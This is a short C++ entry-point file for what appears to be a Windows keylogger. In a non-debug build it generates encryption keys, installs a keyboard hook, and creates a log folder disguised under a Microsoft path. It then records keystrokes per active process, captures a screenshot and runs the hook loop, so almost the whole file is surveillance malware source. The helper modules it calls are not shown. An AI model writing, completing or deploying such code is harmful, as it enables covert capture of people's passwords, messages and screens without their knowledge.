#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "encrypt.h"

//#define DEBUG

int main() {
#ifdef DEBUG
#endif

#ifndef DEBUG
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\blxr"));
  Stream::MakeFile();
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\blxr\)"), "Screen.jpeg");

  KeyHook::HandleMessage(true);
#endif
  return 0;
}


